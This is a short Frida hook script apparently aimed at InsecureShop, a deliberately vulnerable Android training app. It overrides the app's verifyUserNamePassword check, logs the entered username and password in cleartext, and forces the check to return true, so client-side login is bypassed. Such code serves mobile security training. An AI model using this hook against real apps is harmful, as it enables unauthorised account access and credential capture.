Java.perform(function () {
    var Util = Java.use('com.insecureshop.util.Util');
    Util.verifyUserNamePassword.implementation = function (u, p) {
        var real = this.verifyUserNamePassword(u, p);   // 원래 결과 관측
        console.log('[OBSERVE] verifyUserNamePassword(username="' + u + '", password="' + p + '") -> ' + real);
        console.log('[BYPASS]  forcing return = true  (client-side auth neutralized on owned app)');
        return true;                                     // 우회: 무조건 통과
    };
    console.log('[*] hook installed on com.insecureshop.util.Util.verifyUserNamePassword');
});
